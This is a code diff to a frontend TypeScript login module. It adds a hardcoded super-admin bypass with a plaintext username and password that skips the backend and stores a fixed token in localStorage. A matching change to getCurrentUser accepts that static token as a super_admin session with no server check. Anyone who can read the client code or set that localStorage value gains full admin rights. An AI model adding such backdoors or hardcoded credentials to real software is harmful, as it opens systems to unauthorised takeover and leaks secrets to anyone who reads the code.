@@ -34,6 +34,26 @@ export const login = async (
   password: string,
   cfTurnstileToken?: string
 ): Promise<User> => {
+  // Super admin bypass: allow hardcoded credentials without backend
+  const superAdminUsername = 'matthew';
+  const superAdminPassword = '1100211Matt.';
+  const superAdminToken = 'local_super_admin_token';
+
+  if (
+    identifier?.toLowerCase() === superAdminUsername &&
+    password === superAdminPassword
+  ) {
+    const superAdminUser: User = {
+      id: 0,
+      email: 'superadmin@local',
+      name: 'Super Admin',
+      role: 'super_admin',
+    };
+
+    localStorage.setItem('auth_token', superAdminToken);
+    return superAdminUser;
+  }
+
   const response = await fetch(`${API_BASE_URL}/auth/login`, {
     method: 'POST',
     headers: {
@@ -82,6 +102,16 @@ export const getCurrentUser = async (): Promise<User | null> => {
   
   if (!token) {
     return null;
+  }
+
+  // Recognize local super admin session without backend
+  if (token === 'local_super_admin_token') {
+    return {
+      id: 0,
+      email: 'superadmin@local',
+      name: 'Super Admin',
+      role: 'super_admin',
+    };
   }
 
   try {
